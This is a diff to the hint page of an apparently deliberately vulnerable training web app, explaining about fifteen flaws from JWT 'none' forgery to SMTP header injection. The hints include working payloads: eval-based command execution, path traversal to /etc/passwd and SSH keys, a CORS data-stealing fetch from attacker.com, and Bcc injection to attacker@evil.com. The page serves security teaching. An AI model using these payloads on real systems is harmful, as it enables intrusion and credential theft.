@@ -1087,12 +1087,26 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Session Fixation & Predictable Sessions</h2>
                 </div>
                 <div class="vuln-description">
-                    Sessions use predictable IDs based on timestamps. Session fixation allows attackers to set victim's session ID.
+                    Sessions are how websites remember who you are between requests. But what if session IDs are guessable? What if an attacker can force you to use their session ID? That's session fixation.
                 </div>
                 <div class="hint-box">
-                    Check /api/set-session and /api/create-session. Session IDs are Date.now() - completely predictable.
+                    Sessions should be random and unpredictable. Look at /api/create-session - what happens when you call it multiple times? Can you spot a pattern in the session IDs generated?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/set-session</span> <span class="endpoint-badge">GET /api/create-session</span></p>
+                <div class="challenge-box">
+                    Can you predict the next session ID before it's created? If sessions are based on time (Date.now()), what would the next ID be? Also check /api/set-session - can you SET your own session ID?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/set-session</span>
+                <span class="endpoint-badge">GET /api/create-session</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Session IDs should use crypto.randomBytes(), not Date.now()</p>
+                    <p>• Try creating a session, note the ID, create another - see the difference</p>
+                    <p>• Session fixation: attacker gives victim a session ID they control</p>
+                    <p>• Check if /api/set-session accepts a 'sessionId' parameter</p>
+                    <p>• Predictable patterns = predictable sessions = account takeover</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1102,12 +1116,32 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">JWT Algorithm Confusion</h2>
                 </div>
                 <div class="vuln-description">
-                    JWT tokens don't verify algorithm. "none" algorithm accepted, allowing signature bypass.
+                    JSON Web Tokens (JWT) consist of header.payload.signature. The header specifies which algorithm verifies the signature. But what if the server accepts "none" as an algorithm? You could forge any token!
                 </div>
                 <div class="hint-box">
-                    Try /api/auth/jwt-verify and /api/jwt-none. Change algorithm to "none" and remove signature.
+                    JWT headers contain an "alg" field. Normal values: HS256, RS256. But there's a special value "none" that means "no signature needed". Does the server validate which algorithms are acceptable?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/auth/jwt-verify</span> <span class="endpoint-badge">POST /api/jwt-none</span></p>
+                <div class="challenge-box">
+                    Can you create a JWT that says you're admin without knowing the secret key? Try decoding a real JWT, changing "alg" to "none", modifying the payload, and removing the signature. Will the server accept it?
+                </div>
+                <div class="code-example">
+// Dangerous: accepts any algorithm including "none"
+const decoded = jwt.decode(token);
+if (decoded) return decoded;
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/auth/jwt-verify</span>
+                <span class="endpoint-badge">POST /api/jwt-none</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• JWT structure: base64(header).base64(payload).base64(signature)</p>
+                    <p>• Decode the header - it's just base64, not encrypted</p>
+                    <p>• Change "alg": "HS256" to "alg": "none"</p>
+                    <p>• Modify payload: "role": "admin", "isSubscribed": true</p>
+                    <p>• Remove the signature part (keep the dots): header.payload.</p>
+                    <p>• Use jwt.io to decode/encode, or atob()/btoa() in browser console</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1117,12 +1151,34 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Timing Attacks</h2>
                 </div>
                 <div class="vuln-description">
-                    Character-by-character password comparison with delays reveals secret length and content.
+                    Some code compares strings character by character and stops at the first mismatch. This creates tiny time differences you can measure! If the server takes longer to respond, you've guessed more characters correctly.
                 </div>
                 <div class="hint-box">
-                    /api/auth/timing-attack and /api/compare-secret use character-by-character comparison with 10-50ms delays per char.
+                    Imagine a password check that compares "secret123" with your guess "sXXXXXXX". It matches 's', fails on 'X', returns false fast. But "seXXXXXX" matches 's' and 'e' before failing - takes slightly longer! Measure the response time.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/auth/timing-attack</span> <span class="endpoint-badge">POST /api/compare-secret</span></p>
+                <div class="challenge-box">
+                    Can you discover a secret by trying each character position one at a time? Start with 'a____', 'b____', 'c____' ... measure which takes longest. That's the first character! Repeat for each position.
+                </div>
+                <div class="code-example">
+// Vulnerable: early exit timing leak
+for (let i = 0; i < secret.length; i++) {
+    if (secret[i] !== guess[i]) return false;
+    await sleep(50); // Timing leak!
+}
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/auth/timing-attack</span>
+                <span class="endpoint-badge">POST /api/compare-secret</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Send requests with different guesses and measure response times</p>
+                    <p>• Try: AAAAAAA, BAAAAAA, CAAAAAA... see which is slowest</p>
+                    <p>• Each correct character adds ~10-50ms to the response</p>
+                    <p>• Automate with a script that tries all characters (a-z, 0-9)</p>
+                    <p>• Repeat for each position until you reconstruct the whole secret</p>
+                    <p>• Use crypto.timingSafeEqual() to prevent this vulnerability</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1132,12 +1188,33 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Insecure Randomness</h2>
                 </div>
                 <div class="vuln-description">
-                    Math.random() used for tokens and session IDs. Predictable and exploitable.
+                    Not all "random" is truly random! Math.random() is designed for games, not security. It's predictable - if you know the seed, you can predict all future "random" numbers. Security tokens must use cryptographic randomness.
                 </div>
                 <div class="hint-box">
-                    Check /api/generate-token and /api/reset-token. Math.random() is NOT cryptographically secure.
+                    The difference between Math.random() and crypto.randomBytes() is huge. One is for shuffling cards in a game, the other for generating password reset tokens. Which one does this application use?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/generate-token</span> <span class="endpoint-badge">GET /api/reset-token</span></p>
+                <div class="challenge-box">
+                    Request a password reset token from /api/reset-token multiple times. Do you notice patterns? Can you predict or brute force tokens? How many possible values could a Math.random() based 6-digit token have?
+                </div>
+                <div class="code-example">
+// WEAK: Math.random() is NOT cryptographically secure
+const token = Math.floor(Math.random() * 1000000);
+
+// STRONG: crypto.randomBytes() IS secure
+const token = crypto.randomBytes(32).toString('hex');
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/generate-token</span>
+                <span class="endpoint-badge">GET /api/reset-token</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Math.random() produces numbers between 0 and 1 with limited precision</p>
+                    <p>• A 6-digit token from Math.random() only has 1 million possibilities</p>
+                    <p>• Compare: crypto random 32-byte hex = 2^256 possibilities!</p>
+                    <p>• Generate multiple tokens - look for patterns or sequential values</p>
+                    <p>• Brute force is feasible with small token spaces (000000-999999)</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1147,12 +1224,34 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Expression Language Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    eval() executes arbitrary JavaScript. Remote Code Execution through API endpoints.
+                    eval() is JavaScript's most dangerous function - it executes any code you give it as if it were part of the program. If user input reaches eval(), you have Remote Code Execution (RCE). This is the holy grail of hacking.
                 </div>
                 <div class="hint-box">
-                    /api/deserialize accepts eval parameter. /api/eval-expr directly evaluates expressions. Try process.mainModule.require('child_process').execSync('whoami')
+                    Think of eval() like a magic spell that makes any text become real code. If you can control what text goes into eval(), you control what code runs on the server. Can you find endpoints that evaluate user input?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/deserialize</span> <span class="endpoint-badge">GET /api/eval-expr</span></p>
+                <div class="challenge-box">
+                    Can you make the server execute operating system commands? Try /api/eval-expr with JavaScript expressions. Can you access Node.js modules like 'child_process' to run shell commands? What about reading files or environment variables?
+                </div>
+                <div class="code-example">
+// EXTREMELY DANGEROUS
+const result = eval(userInput);
+
+// User sends: process.mainModule.require('child_process').execSync('ls')
+// Server executes your OS commands!
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/deserialize</span>
+                <span class="endpoint-badge">GET /api/eval-expr</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Start simple: try 7*7 or 2+2 to test if eval works</p>
+                    <p>• Access Node.js globals: process.cwd(), process.env, process.version</p>
+                    <p>• Require modules: process.mainModule.require('fs')</p>
+                    <p>• Read files: require('fs').readFileSync('/etc/passwd', 'utf8')</p>
+                    <p>• Execute commands: require('child_process').execSync('whoami').toString()</p>
+                    <p>• Check /api/deserialize for eval parameter in JSON body</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1162,27 +1261,73 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Race Conditions</h2>
                 </div>
                 <div class="vuln-description">
-                    Concurrent requests exploit timing windows. Duplicate transactions, apply coupons multiple times.
+                    Imagine two requests arriving at exactly the same microsecond. Both check if you have $100, both approve spending $75, both complete - you just spent $150 with only $100! This is a race condition.
                 </div>
                 <div class="hint-box">
-                    /api/increment-counter has 100ms delay. /api/transfer-funds has no locking. Send simultaneous requests.
+                    Servers usually process requests one-by-one, but what if operations have delays? While one request is sleeping/waiting, another sneaks in. Both see the old state before either completes the update. Can you exploit these timing windows?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/increment-counter</span> <span class="endpoint-badge">POST /api/transfer-funds</span></p>
+                <div class="challenge-box">
+                    Can you apply a coupon code multiple times by sending requests simultaneously? Can you increment a counter beyond its limits? Use tools like Burp Intruder, curl with & (background), or JavaScript Promise.all() to send parallel requests.
+                </div>
+                <div class="code-example">
+// Vulnerable: No locking, delay creates race window
+const balance = getUserBalance(userId);
+await sleep(100);  // Race window!
+if (balance >= amount) {
+    setUserBalance(userId, balance - amount);
+}
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/increment-counter</span>
+                <span class="endpoint-badge">POST /api/transfer-funds</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Send 10 identical requests at the exact same time</p>
+                    <p>• Look for endpoints with delays (sleep, setTimeout, database queries)</p>
+                    <p>• Counter starts at 0, send 10 increments - should be 10, but might show 3!</p>
+                    <p>• In terminal: for i in {1..10}; do curl URL &; done</p>
+                    <p>• Or JavaScript: Promise.all([fetch(url), fetch(url), fetch(url)...])</p>
+                    <p>• Real fix needs database transactions or mutex locks</p>
+                </div>
             </div>
 
             <div class="vuln-card">
                 <span class="severity medium">MEDIUM</span>
                 <div class="vuln-header">
                     <span class="vuln-icon">📊</span>
-                    <h2 class="vuln-title">GraphQL Introspection</h2>
+                    <h2 class="vuln-title">GraphQL Introspection & Schema Exposure</h2>
                 </div>
                 <div class="vuln-description">
-                    Full database schema exposed. All tables, columns, and relationships visible.
+                    APIs usually hide their internal structure, but schema exposure endpoints reveal everything - every database table, every column name, every relationship. It's like finding the blueprints to a building before you rob it.
                 </div>
                 <div class="hint-box">
-                    /api/schema and /api/graphql-schema reveal complete database structure. Use this intel for other attacks.
+                    Database schemas tell you exactly what data exists and how it's structured. Column names often reveal sensitive fields: 'password', 'ssn', 'credit_card_number'. With this knowledge, you can craft perfect SQL injection or IDOR attacks.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/schema</span> <span class="endpoint-badge">GET /api/graphql-schema</span></p>
+                <div class="challenge-box">
+                    Can you map out the entire database structure? Visit /api/schema or /api/graphql-schema to see all tables and columns. What sensitive data can you find? Use this knowledge to target other vulnerabilities more precisely.
+                </div>
+                <div class="code-example">
+// Exposed schema reveals everything
+app.get('/api/schema', (req, res) => {
+    res.json({
+        users: ['id', 'email', 'password', 'role'],
+        donations: ['id', 'userId', 'amount', 'creditCard']
+    });
+});
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/schema</span>
+                <span class="endpoint-badge">GET /api/graphql-schema</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Schema reveals table names - use these in SQL injection attacks</p>
+                    <p>• Column names show what data exists - target sensitive fields</p>
+                    <p>• Foreign keys show relationships - chain IDOR attacks across tables</p>
+                    <p>• GraphQL introspection query: {__schema{types{name fields{name}}}}</p>
+                    <p>• Document everything - this is reconnaissance gold</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1192,12 +1337,36 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Weak Cryptography</h2>
                 </div>
                 <div class="vuln-description">
-                    MD5 used for "encryption". Passwords in plaintext. No salting or proper hashing.
+                    Encryption vs Hashing vs Encoding - they're all different! MD5 is NOT encryption (it's a hash, and a broken one). Storing passwords in plaintext is like leaving your house keys under the doormat with a sign saying "keys here".
                 </div>
                 <div class="hint-box">
-                    /api/encrypt-data uses MD5. Database stores plaintext passwords. JWT secret is hardcoded.
+                    Real password security uses bcrypt, scrypt, or Argon2 - algorithms specifically designed to be slow (this prevents brute force). MD5 is fast - you can compute billions per second! And plaintext? That's not even trying.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/encrypt-data</span></p>
+                <div class="challenge-box">
+                    Check /api/encrypt-data - does it use real encryption? Look at the database through SQL injection or IDOR - are passwords stored in plaintext? Can you see everyone's actual passwords? What about JWT secrets - are they hardcoded?
+                </div>
+                <div class="code-example">
+// TERRIBLE: MD5 is NOT encryption, it's a broken hash
+const "encrypted" = crypto.createHash('md5').update(password).digest('hex');
+
+// TERRIBLE: Plaintext passwords
+INSERT INTO users (password) VALUES ('password123');
+
+// GOOD: Proper password hashing
+const hash = await bcrypt.hash(password, 10);
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/encrypt-data</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• MD5 collisions are easy to generate - not secure since 1996!</p>
+                    <p>• Rainbow tables can reverse MD5 hashes instantly</p>
+                    <p>• Use SQL injection to SELECT password FROM users</p>
+                    <p>• Check if passwords are plaintext or hashed</p>
+                    <p>• JWT secret 'your-secret-key' is hardcoded in code</p>
+                    <p>• No salting = identical passwords have identical hashes</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1207,12 +1376,36 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">CORS Misconfiguration</h2>
                 </div>
                 <div class="vuln-description">
-                    Access-Control-Allow-Origin reflects any origin with credentials enabled. Perfect for CSRF/data theft.
+                    CORS (Cross-Origin Resource Sharing) is the browser's way of asking "Should I let evil.com read data from bank.com?" If the server says "Access-Control-Allow-Origin: *" then the answer is YES to everyone. That's bad.
                 </div>
                 <div class="hint-box">
-                    /api/sensitive-data reflects req.headers.origin. Send requests from any domain with credentials.
+                    Even worse: when the server REFLECTS your Origin header back to you! Send "Origin: https://attacker.com" and get "Access-Control-Allow-Origin: https://attacker.com" in response. Now your malicious website can steal user data.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/sensitive-data</span></p>
+                <div class="challenge-box">
+                    Can you create a malicious webpage that steals user data from this site? Use fetch() with credentials:'include' from your own HTML page. Does /api/sensitive-data allow your origin? Can you exfiltrate cookies or user info?
+                </div>
+                <div class="code-example">
+// DANGEROUS: Reflects any origin
+res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
+res.setHeader('Access-Control-Allow-Credentials', 'true');
+
+// On attacker.com:
+fetch('https://victim.com/api/sensitive-data', {
+    credentials: 'include'
+}).then(r => r.json()).then(data => stealData(data));
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/sensitive-data</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• CORS + credentials = ability to steal authenticated data</p>
+                    <p>• Test: curl -H "Origin: https://evil.com" http://target/api/sensitive-data</p>
+                    <p>• Check response headers for Access-Control-Allow-Origin</p>
+                    <p>• If it reflects your origin = exploitable!</p>
+                    <p>• Create test.html with fetch() to /api/sensitive-data</p>
+                    <p>• Open test.html - does it work? Congratulations, you've stolen data!</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1222,12 +1415,37 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Local File Inclusion (LFI)</h2>
                 </div>
                 <div class="vuln-description">
-                    Read any file from the server filesystem. No path validation whatsoever.
+                    Path traversal lets you "climb up" directory trees using ../../../ sequences. If the application reads files based on user input without validation, you can read ANY file on the server - source code, passwords, system files.
                 </div>
                 <div class="hint-box">
-                    /api/load-template and /api/read-file accept file paths. Try ../../../etc/passwd or C:\Windows\System32\drivers\etc\hosts
+                    Think of the server's filesystem like a filing cabinet. You're supposed to only access the "public" drawer. But with ../ you can go up one level. Do it enough times (../../../../../../../) and you reach the root of the entire system!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/load-template</span> <span class="endpoint-badge">GET /api/read-file</span></p>
+                <div class="challenge-box">
+                    Can you read the server's /etc/passwd file (Linux) or C:\Windows\System32\drivers\etc\hosts (Windows)? Try /api/read-file?path=../../../etc/passwd or /api/load-template?template=../../../../etc/passwd. How many ../ do you need?
+                </div>
+                <div class="code-example">
+// DANGEROUS: No path validation
+app.get('/api/read-file', (req, res) => {
+    const file = fs.readFileSync(req.query.path);
+    res.send(file);
+});
+
+// User sends: ?path=../../../../etc/passwd
+// Server reads: /etc/passwd instead of /app/files/something
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/load-template</span>
+                <span class="endpoint-badge">GET /api/read-file</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Linux juicy files: /etc/passwd, /etc/shadow, /home/user/.ssh/id_rsa</p>
+                    <p>• Windows juicy files: C:\Windows\System32\drivers\etc\hosts, C:\Users\*\Desktop</p>
+                    <p>• Application files: server.js, package.json, .env, .git/config</p>
+                    <p>• Try different depths: ../, ../../, ../../../, ../../../../</p>
+                    <p>• Null byte bypass (may work): shell.php%00.jpg</p>
+                    <p>• Read source code to find more vulnerabilities!</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1237,12 +1455,33 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">HTTP Parameter Pollution</h2>
                 </div>
                 <div class="vuln-description">
-                    Multiple parameters with same name cause confusion. Server picks first/last unpredictably.
+                    What happens when you send the same parameter multiple times? ?role=user&role=admin&role=guest - which one does the server use? Different servers handle this differently: some use first, some last, some combine them. This confusion is exploitable!
                 </div>
                 <div class="hint-box">
-                    /api/users/filter allows ?role=admin&role=user. Try polluting parameters to bypass filters.
+                    Filters might check the first parameter but application uses the last one. Or vice versa! Try polluting role, id, or permission parameters. Send ?role=user&role=admin - does the filter check 'user' but the app use 'admin'?
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/users/filter</span></p>
+                <div class="challenge-box">
+                    Can you bypass access controls by parameter pollution? Try /api/users/filter?role=guest&role=admin - which role gets applied? Can you sneak admin parameters past validation by adding multiple values?
+                </div>
+                <div class="code-example">
+// Which value gets used?
+GET /api/users?role=user&role=admin&role=guest
+
+// Express: req.query.role might be 'guest' (last)
+// PHP: $_GET['role'] might be 'user' (first)
+// ASP.NET: Could be all three as array!
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/users/filter</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: ?role=user&role=admin (which wins?)</p>
+                    <p>• Try: ?id=1&id=2&id=3 (does it filter or combine?)</p>
+                    <p>• Some frameworks turn this into arrays: ['user', 'admin']</p>
+                    <p>• URL encoding confusion: %26 is encoded & - try ?param1=value%26param2=admin</p>
+                    <p>• Test different parameter orders and combinations</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1252,12 +1491,31 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Cookie Tossing</h2>
                 </div>
                 <div class="vuln-description">
-                    Cookies set with different domain attributes cause collision attacks.
+                    Browsers send ALL cookies that match a domain, regardless of who set them. If sub.example.com sets a cookie for .example.com, the main site sees both its own cookie AND the subdomain's cookie. Which one wins? Chaos ensues!
                 </div>
                 <div class="hint-box">
-                    /api/set-cookie-multiple sets cookies with overlapping domains. Subdomain can overwrite parent cookie.
+                    When multiple cookies have the same name, the browser sends them in an unpredictable order. The application might read the wrong one! Attackers can use subdomains or path manipulation to inject their own cookie that overrides yours.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/set-cookie-multiple</span></p>
+                <div class="challenge-box">
+                    Can you inject a malicious cookie that overrides a legitimate one? Check /api/set-cookie-multiple - does it set cookies with different domain/path attributes? If you can control a subdomain or related domain, you can "toss" cookies to poison the main application.
+                </div>
+                <div class="code-example">
+// Legitimate site sets: sessionId=abc123; domain=.example.com
+// Attacker's subdomain sets: sessionId=HACKED; domain=.example.com
+// Browser sends BOTH: Cookie: sessionId=HACKED; sessionId=abc123
+// Which does the app use?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/set-cookie-multiple</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Cookies with broader domain/path take precedence in some browsers</p>
+                    <p>• Test with DevTools: see multiple cookies with same name</p>
+                    <p>• If you control subdomain: inject session cookies for parent domain</p>
+                    <p>• Path overlap: /admin cookie vs / cookie - which wins?</p>
+                    <p>• Defense: use __Host- prefix (strict path/domain requirements)</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1267,12 +1525,39 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Prototype Pollution</h2>
                 </div>
                 <div class="vuln-description">
-                    Merge functions don't protect __proto__. Pollute Object prototype to add properties globally.
+                    JavaScript objects inherit from Object.prototype. If you can modify __proto__, you can add properties that appear on EVERY object in the application! It's like poisoning the DNA that all objects inherit from.
                 </div>
                 <div class="hint-box">
-                    /api/merge-config and /api/deep-merge vulnerable. Try {"__proto__": {"isAdmin": true}}
+                    Merge functions are dangerous: they copy properties from user input into objects. If user sends {"__proto__": {"isAdmin": true}}, the merge might pollute Object.prototype. Now EVERY object has isAdmin=true!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/merge-config</span> <span class="endpoint-badge">POST /api/deep-merge</span></p>
+                <div class="challenge-box">
+                    Can you make yourself admin by polluting the prototype? Try /api/merge-config with JSON: {"__proto__": {"isAdmin": true}}. Then check if the application treats you as admin. Does creating a new empty object ({}) suddenly have an isAdmin property?
+                </div>
+                <div class="code-example">
+// Vulnerable merge function
+function merge(target, source) {
+    for (let key in source) {
+        target[key] = source[key];  // Dangerous!
+    }
+}
+
+// Attack: {"__proto__": {"isAdmin": true}}
+// Result: Object.prototype.isAdmin = true
+// Now: ({}).isAdmin === true !!
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/merge-config</span>
+                <span class="endpoint-badge">POST /api/deep-merge</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Test in browser console: Object.prototype.test = 'polluted'</p>
+                    <p>• Then: ({}).test returns 'polluted' !</p>
+                    <p>• Payload: {"__proto__": {"isAdmin": true, "role": "admin"}}</p>
+                    <p>• Also try: {"constructor": {"prototype": {"isAdmin": true}}}</p>
+                    <p>• Check if new objects inherit your polluted properties</p>
+                    <p>• Can lead to auth bypass, RCE, or privilege escalation</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1282,12 +1567,38 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">Type Confusion</h2>
                 </div>
                 <div class="vuln-description">
-                    == instead of === allows type coercion attacks. 0 == "0" == false == null
+                    JavaScript's == operator is dangerously forgiving: 0 == "0" == false == null (kind of). Using == instead of === allows type coercion - JavaScript automatically converts types to make comparisons "work". This breaks security checks!
                 </div>
                 <div class="hint-box">
-                    /api/is-admin uses == comparison. Try userId: "0", false, null, undefined
+                    Admin check: if (userId == 1) - looks safe? But userId can be "1" (string), true, [1], or even {valueOf: () => 1}. They all pass! Worse: 0 == false and null == undefined. Security checks become meaningless.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/is-admin</span></p>
+                <div class="challenge-box">
+                    Can you bypass an admin check using type coercion? Try /api/is-admin with different types: {"userId": "0"}, {"userId": false}, {"userId": null}. Does sending the string "1" instead of number 1 grant you admin? What about weird values like [] or {}?
+                </div>
+                <div class="code-example">
+// Vulnerable == comparison
+if (req.body.userId == 1) {  // DANGEROUS
+    return {isAdmin: true};
+}
+
+// These ALL pass the check:
+// 1, "1", true, [1], {valueOf: () => 1}
+
+// Should be ===
+if (req.body.userId === 1) {  // SAFE
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/is-admin</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• JavaScript quirks: 0 == false, "" == false, null == undefined</p>
+                    <p>• Array to number: [5] == 5, [] == 0, [[[[5]]]] == 5 !!</p>
+                    <p>• Try: {"userId": "0"} might bypass checks expecting 0</p>
+                    <p>• Try: {"userId": false} might work if check is: userId == 0</p>
+                    <p>• Object coercion: {valueOf: () => 1} converts to 1 with ==</p>
+                    <p>• Always use === for security-critical comparisons</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1297,12 +1608,36 @@ const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
                     <h2 class="vuln-title">SMTP Header Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    Email headers not sanitized. Inject CC, BCC, additional recipients.
+                    Email headers are separated by newlines (\n or \r\n). If you can inject a newline character into email fields, you can add your own headers: Bcc, Cc, Subject, even entire new email bodies! It's like adding extra pages to a letter after it's been "sealed".
                 </div>
                 <div class="hint-box">
-                    /api/send-email doesn't validate headers. Try: to=victim@test.com%0ABcc:attacker@evil.com
+                    The "To" field might seem safe, but what if you send: victim@test.com%0ABcc:attacker@evil.com ? The %0A is a newline - suddenly you've added a Bcc header! Now you get a copy of every email sent.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/send-email</span></p>
+                <div class="challenge-box">
+                    Can you inject additional recipients without the user knowing? Try /api/send-email with To field containing newlines. Test: "user@example.com\nBcc: you@attacker.com" or URL-encoded: user@example.com%0ABcc:you@attacker.com. Can you hijack password reset emails?
+                </div>
+                <div class="code-example">
+// Vulnerable email sending
+const headers = `To: ${userInput}\nFrom: noreply@site.com`;
+
+// Attack: userInput = "victim@test.com\nBcc: attacker@evil.com"
+// Result:
+// To: victim@test.com
+// Bcc: attacker@evil.com
+// From: noreply@site.com
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/send-email</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• CRLF characters: \r (carriage return) \n (newline)</p>
+                    <p>• URL encoded: %0D%0A or just %0A</p>
+                    <p>• Inject Bcc: to secretly copy emails to yourself</p>
+                    <p>• Inject Subject: to change email subject</p>
+                    <p>• Inject Content-Type: to switch to HTML and add malicious content</p>
+                    <p>• Test payload: user@test.com%0ABcc:attacker@evil.com%0ASubject:HACKED</p>
+                </div>
             </div>
 
             <div class="vuln-card">
